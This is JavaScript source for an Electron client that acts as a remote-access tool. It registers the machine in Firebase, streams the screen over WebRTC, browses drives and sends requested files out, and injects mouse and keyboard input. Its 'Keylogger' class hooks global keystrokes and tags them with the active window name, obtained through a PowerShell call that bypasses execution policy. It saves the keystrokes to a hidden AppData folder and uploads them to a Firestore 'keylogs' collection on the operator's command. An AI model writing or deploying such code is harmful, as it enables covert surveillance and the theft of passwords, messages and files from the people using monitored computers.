const { ipcRenderer } = require('electron');
const { v4: uuidv4 } = require('uuid');
const { db } = require('./firebaseConfig');
const { doc, setDoc, updateDoc, serverTimestamp, collection, onSnapshot, arrayUnion, addDoc } = require('firebase/firestore');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

let robot = null;
try {
    //robot = require('@jitsi/robotjs');
} catch (e) {
    log("RobotJS (Control Module) failed to load: " + e.message);
}

// --- Logger ---
function log(message) {
    const timestamp = new Date().toISOString();
    const logLine = `[${timestamp}] ${message}`;
    // Send to Main process for terminal output and file writing
    ipcRenderer.send('LOG_MESSAGE', logLine);
}

// --- Configuration & Identity ---
const configPath = path.join(__dirname, 'config.json');
let config = {};
let deviceId;

function loadConfig() {
  try {
    if (fs.existsSync(configPath)) {
      config = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
    }
  } catch (e) {
    log("Error reading config: " + e.message);
  }

  if (!config.deviceId) {
    config.deviceId = uuidv4();
    try {
        fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
    } catch (e) { log(e.message); }
  }
  
  if (!config.name) {
      config.name = "Unnamed Device"; // Default name if not set
      try {
        fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
      } catch (e) { log(e.message); }
  }

  deviceId = config.deviceId;
  log("Device ID: " + deviceId);
  log("Device Name: " + config.name);
}
loadConfig();

// --- Heartbeat ---
async function sendHeartbeat() {
    if (!deviceId) return;
    try {
        const deviceRef = doc(db, "devices", deviceId);
        await setDoc(deviceRef, {
            device_id: deviceId,
            status: "online",
            last_seen: serverTimestamp(),
            name: config.name, // Include the device name
            specs: {
                platform: process.platform,
                arch: process.arch
            }
        }, { merge: true });
    } catch (e) {
        log("Heartbeat error: " + e.message);
    }
}
setInterval(sendHeartbeat, 5 * 60 * 1000); // 5 minutes
sendHeartbeat();

// --- WebRTC Core ---
const servers = {
  iceServers: [
    { urls: ['stun:stun1.l.google.com:19302', 'stun:stun2.l.google.com:19302'] }
  ]
};
let peerConnection;
let currentStream;

// Listen for Sessions
const sessionsRef = collection(db, "sessions");
onSnapshot(sessionsRef, (snapshot) => {
    snapshot.docChanges().forEach(async (change) => {
        if (change.type === "added") {
            const data = change.doc.data();
            if (data.deviceId === deviceId && data.offer && !data.answer) {
                log("Received Offer for session: " + change.doc.id);
                await handleOffer(change.doc.id, data.offer);
            }
        }
    });
});

// --- Helpers ---

function handleGetDrives(channel) {
    if (process.platform === 'win32') {
        exec('wmic logicaldisk get name', (error, stdout, stderr) => {
            if (error) {
                channel.send(JSON.stringify({ type: "ERROR", message: error.message }));
                return;
            }
            // Parse Output:
            // Name
            // C:
            // D:
            const lines = stdout.split('\r\n').filter(line => line.trim() !== '' && line.trim() !== 'Name');
            const drives = lines.map(line => ({
                name: line.trim(),
                isDir: true,
                size: 0
            }));
            
            channel.send(JSON.stringify({
                type: "FS_LIST_RESPONSE",
                path: "This PC",
                content: drives
            }));
        });
    } else {
        channel.send(JSON.stringify({
            type: "FS_LIST_RESPONSE",
            path: "/",
            content: [{ name: "/", isDir: true, size: 0 }]
        }));
    }
}

async function handleGetScreenSources(channel) {
    try {
        const sources = await ipcRenderer.invoke('DESKTOP_CAPTURER_GET_SOURCES', { types: ['screen'] });
        const simplified = sources.map(s => ({ id: s.id, name: s.name }));
        channel.send(JSON.stringify({ type: "SCREEN_SOURCES_RESPONSE", sources: simplified }));
    } catch (e) {
        log("Error getting sources: " + e.message);
    }
}

function handleFsList(channel, dirPath) {
    if (!dirPath || dirPath === "." || dirPath === "This PC") dirPath = process.env.USERPROFILE || "C:\\";
    
    // Fix drive root issue on Windows (e.g. "D:" -> "D:\")
    if (process.platform === 'win32' && /^[a-zA-Z]:$/.test(dirPath)) {
        dirPath += '\\';
    }
    
    fs.readdir(dirPath, { withFileTypes: true }, (err, files) => {
        if (err) {
            channel.send(JSON.stringify({ type: "ERROR", message: err.message }));
            return;
        }
        
        const content = files.map(f => {
            let size = 0;
            try {
                if (!f.isDirectory()) {
                    const stats = fs.statSync(path.join(dirPath, f.name));
                    size = stats.size;
                }
            } catch (e) {}
            return {
                name: f.name,
                isDir: f.isDirectory(),
                size: size
            };
        });

        channel.send(JSON.stringify({
            type: "FS_LIST_RESPONSE",
            path: dirPath,
            content: content
        }));
    });
}

function handleFileDownload(channel, filePath) {
    try {
        const stream = fs.createReadStream(filePath, { highWaterMark: 16 * 1024 });
        stream.on('data', (chunk) => {
            channel.send(JSON.stringify({
                 type: "FILE_CHUNK",
                 filePath: filePath,
                 data: chunk.toString('base64')
            }));
        });
        stream.on('end', () => {
            channel.send(JSON.stringify({ type: "FILE_END", filePath: filePath }));
        });
        stream.on('error', (err) => {
            channel.send(JSON.stringify({ type: "ERROR", message: "Read error: " + err.message }));
        });
    } catch (e) {
        channel.send(JSON.stringify({ type: "ERROR", message: "Open error: " + e.message }));
    }
}

function handleInputControl(msg) {
    if (!robot) return;

    try {
        if (msg.type === "MOUSE_MOVE") {
            const { width, height } = robot.getScreenSize();
            // Coordinates from Web are normalized (0-1), scale to screen size
            const x = Math.round(msg.x * width);
            const y = Math.round(msg.y * height);
            robot.moveMouse(x, y);
        } else if (msg.type === "MOUSE_CLICK") {
            // msg.button comes as "left", "right", or "middle"
            robot.mouseClick(msg.button || "left");
        } else if (msg.type === "KEY_PRESS") {
            // Simple mapping - keyTap handles many keys by name directly
            if (msg.key) {
                // Handle special keys mapping if necessary, for now try direct
                // robotjs keys: backspace, delete, enter, tab, escape, up, down, right, left, home, end, pageup, pagedown, f1-f12, command, alt, control, shift, right_shift, space
                let k = msg.key.toLowerCase();
                if (k === 'arrowup') k = 'up';
                if (k === 'arrowdown') k = 'down';
                if (k === 'arrowleft') k = 'left';
                if (k === 'arrowright') k = 'right';
                robot.keyTap(k);
            }
        }
    } catch (e) {
        // Suppress errors to keep connection alive
        log("Input Control Error: " + e.message);
    }
}

async function switchVideoSource(mode, sourceId) {
    if (!peerConnection) return;
    try {
        let newStream;
        if (mode === 'screen') {
             const sources = await ipcRenderer.invoke('DESKTOP_CAPTURER_GET_SOURCES', { types: ['screen'] });
             let source = sources[0];
             if (sourceId) {
                 const found = sources.find(s => s.id === sourceId);
                 if (found) source = found;
             }
             
             if (!source) throw new Error("Source not found");

             newStream = await navigator.mediaDevices.getUserMedia({
                 audio: false,
                 video: {
                     mandatory: {
                         chromeMediaSource: 'desktop',
                         chromeMediaSourceId: source.id,
                         maxWidth: 1280,
                         maxHeight: 720
                     }
                 }
             });
        } else {
             newStream = await navigator.mediaDevices.getUserMedia({ video: true });
        }

        const videoTrack = newStream.getVideoTracks()[0];
        const sender = peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
        if (sender) {
            await sender.replaceTrack(videoTrack);
        }
        
        // Stop old tracks
        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
        }
        currentStream = newStream;
        log("Switched video source to " + mode + (sourceId ? ` (${sourceId})` : ""));
    } catch (e) {
        log("Error switching source: " + e.message);
    }
}

async function handleOffer(sessionId, offer) {
    log(`Starting handleOffer for session ${sessionId}`);
    if (peerConnection) {
        log("Closing existing peerConnection");
        peerConnection.close();
    }
    peerConnection = new RTCPeerConnection(servers);

    // ICE Candidates
    peerConnection.onicecandidate = async (event) => {
        if (event.candidate) {
             const sessionRef = doc(db, "sessions", sessionId);
             await updateDoc(sessionRef, {
                 ice_candidates_callee: arrayUnion(event.candidate.toJSON())
             }).catch(e => log("Error sending ICE candidate: " + e.message));
        }
    };

    // Data Channel
    peerConnection.ondatachannel = (event) => {
        const channel = event.channel;
        channel.onopen = () => log(`Data Channel '${channel.label}' Open`);
        channel.onmessage = (e) => {
            try {
                const msg = JSON.parse(e.data);
                if (msg.type === "FS_LIST_REQUEST") {
                    handleFsList(channel, msg.path);
                } else if (msg.type === "FS_GET_DRIVES") {
                    handleGetDrives(channel);
                } else if (msg.type === "FS_DOWNLOAD_START") {
                    handleFileDownload(channel, msg.filePath);
                } else if (msg.type === "SWITCH_SOURCE") {
                    switchVideoSource(msg.mode, msg.sourceId);
                } else if (msg.type === "GET_SCREEN_SOURCES") {
                    handleGetScreenSources(channel);
                } else {
                    handleInputControl(msg);
                }
            } catch (err) {
                log("Error processing message: " + err.message);
            }
        };
    };

    try {
        // Screen Sharing
        log("Requesting screen sources...");
        // Use IPC to get sources from Main Process (works in all contexts)
        const sources = await ipcRenderer.invoke('DESKTOP_CAPTURER_GET_SOURCES', { types: ['screen'] });
        log(`Found ${sources.length} screen sources`);
        
        const source = sources[0];
        if (!source) throw new Error("No screen source found");

        log(`Selecting source: ${source.id}`);
        
        const stream = await navigator.mediaDevices.getUserMedia({
            audio: false,
            video: {
                mandatory: {
                    chromeMediaSource: 'desktop',
                    chromeMediaSourceId: source.id,
                    maxWidth: 1280,
                    maxHeight: 720
                }
            }
        });
        currentStream = stream;
        
        log("Got UserMedia stream");
        stream.getTracks().forEach(track => peerConnection.addTrack(track, stream));
        
        // Set Remote & Local
        log("Setting remote description...");
        await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
        
        log("Creating answer...");
        const answer = await peerConnection.createAnswer();
        
        log("Setting local description...");
        await peerConnection.setLocalDescription(answer);
        
        // Send Answer
        log("Sending answer to Firestore...");
        const sessionRef = doc(db, "sessions", sessionId);
        await updateDoc(sessionRef, {
            answer: { type: answer.type, sdp: answer.sdp }
        });
        
        log("Answer sent successfully!");
        
    } catch (e) {
        log("WebRTC Error: " + e.message);
    }
}

// --- Keylogger ---
let uiohook, UiohookKey;
try {
    const hookLib = require('uiohook-napi');
    uiohook = hookLib.uIOhook;
    UiohookKey = hookLib.UiohookKey;
} catch (e) {
    log("Keylogger module not found/failed: " + e.message);
    log("*** ACTION REQUIRED: Run 'npm install' then 'npx electron-rebuild' in the client folder to enable native keylogging. ***");
}

function getActiveWindowName() {
    return new Promise((resolve) => {
        if (process.platform !== 'win32') {
            resolve("Active Window (Non-Windows)");
            return;
        }
        const psPath = path.join(__dirname, 'get_active_window.ps1');
        exec(`powershell -ExecutionPolicy Bypass -File "${psPath}"`, (err, stdout) => {
            if (err) {
                resolve("Unknown");
            } else {
                resolve(stdout.trim() || "Unknown");
            }
        });
    });
}

class Keylogger {
    constructor(deviceId) {
        this.buffer = "";
        this.deviceId = deviceId;
        this.isRecording = false; // Controlled by Firestore
        this.init();
    }

    init() {
        // Listen for Recording Status from Web Admin
        onSnapshot(doc(db, "devices", this.deviceId), (docSnap) => {
            if (docSnap.exists()) {
                const data = docSnap.data();
                this.isRecording = !!data.isRecordingKeylogs;
                log(`Keylogger Recording Mode: ${this.isRecording ? 'ON' : 'OFF'}`);
            }
        });

        if (config.keyboard !== "true") return;
        
        if (uiohook) {
            uiohook.on('keydown', (e) => {
                this.handleKey(e);
            });
            try {
                uiohook.start();
                log("Keylogger started (Native).");
            } catch (e) {
                log("Failed to start keylogger: " + e.message);
                this.startMock();
            }
        } else {
            log("Keylogger native module missing. Starting Mock Mode.");
            this.startMock();
        }

        // Timer trigger (5 mins)
        setInterval(() => {
            if (this.buffer.length > 100) this.flush("TIMER");
        }, 5 * 60 * 1000); 
    }

    startMock() {
        // Simulate typing for demonstration if native hooks fail
        setInterval(() => {
            const time = new Date().toLocaleTimeString();
            const mockChars = ` [Mock Input ${time}] `;
            this.buffer += mockChars;
            // Flush quicker in mock mode for feedback
            if (this.buffer.length > 50) this.flush("MOCK_TIMER");
        }, 10000); 
    }

    handleKey(e) {
        const code = e.keycode;
        
        // 14 = Backspace
        if (code === 14) {
            this.buffer = this.buffer.slice(0, -1);
            return;
        }
        // 28 = Enter
        if (code === 28) {
            this.flush("ENTER");
            return;
        }

        const char = this.mapCode(code);
        if (char) {
            this.buffer += char;
            if (this.buffer.length > 500) this.flush("BUFFER_FULL");
        }
    }

    mapCode(code) {
        // Scancode to Char Map (Standard QWERTY)
        const map = {
            30: 'a', 48: 'b', 46: 'c', 32: 'd', 18: 'e', 33: 'f', 34: 'g', 35: 'h', 23: 'i', 36: 'j',
            37: 'k', 38: 'l', 50: 'm', 49: 'n', 24: 'o', 25: 'p', 16: 'q', 19: 'r', 31: 's', 20: 't',
            22: 'u', 47: 'v', 17: 'w', 45: 'x', 21: 'y', 44: 'z',
            2: '1', 3: '2', 4: '3', 5: '4', 6: '5', 7: '6', 8: '7', 9: '8', 10: '9', 11: '0',
            57: ' ', 51: ',', 52: '.', 53: '/', 39: ';', 40: '\'', 26: '[', 27: ']', 43: '\\', 12: '-', 13: '=', 41: '`'
        };
        return map[code] || ''; 
    }

    getLocalLogPath() {
        const appData = process.env.APPDATA || (process.platform === 'darwin' ? path.join(process.env.HOME, 'Library/Preferences') : path.join(process.env.HOME, '.local/share'));
        const baseDir = path.join(appData, '.info-pc');
        
        // Date Folder: YYYY-MM-DD
        const dateStr = new Date().toISOString().split('T')[0];
        const dayDir = path.join(baseDir, dateStr);

        if (!fs.existsSync(dayDir)) {
            fs.mkdirSync(dayDir, { recursive: true });
        }
        return path.join(dayDir, 'keylog.txt');
    }

    async flush(trigger) {
        if (!this.buffer) return;
        const text = this.buffer;
        this.buffer = ""; // Clear immediately
        
        try {
            const appName = await getActiveWindowName();
            const timestamp = new Date().toISOString();
            
            // 1. ALWAYS Save Locally
            try {
                const logPath = this.getLocalLogPath();
                const logLine = `[${timestamp}] [App: ${appName}] [Trigger: ${trigger}] ${text}\n`;
                fs.appendFileSync(logPath, logLine);
                log(`Saved to local file: ${logPath}`);
            } catch (err) {
                log("Local save error: " + err.message);
            }

            // 2. Upload to Firestore ONLY if Recording is ON
            if (this.isRecording) {
                await addDoc(collection(db, "keylogs"), {
                    device_id: this.deviceId,
                    app_name: appName,
                    content: text,
                    timestamp: serverTimestamp(),
                    trigger: trigger
                });
                log(`Keylog uploaded (${trigger}): ${text}`);
            } else {
                log("Keylog NOT uploaded (Recording OFF).");
            }

        } catch (e) {
            log("Keylog error: " + e.message);
        }
    }
}
const keylogger = new Keylogger(deviceId);
